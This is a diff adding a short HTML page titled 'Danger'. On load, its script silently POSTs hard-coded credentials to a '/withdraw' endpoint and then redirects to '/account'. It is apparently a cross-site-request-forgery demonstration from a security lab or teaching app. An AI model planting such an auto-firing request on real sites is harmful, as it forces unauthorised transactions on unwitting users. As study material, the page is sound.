@@ -1,0 +1,29 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Danger</title>
+	<script type="text/javascript" src="static/jquery-3.5.1.min.js"></script>
+</head>
+<body>
+	<script>
+		$( document ).ready(function() {
+			let data = new FormData();
+			data.append('username', 'user1');
+			data.append('password', 'password');
+		
+			jQuery.ajax({
+				url: '/withdraw',
+				data: data,
+				cache: false,
+				contentType: false,
+				processData: false,
+				method: 'POST',
+				type: 'POST',
+				success: function(data){
+				    location.href = '/account';
+				}
+			});
+		});
+	</script>
+</body>
+</html>
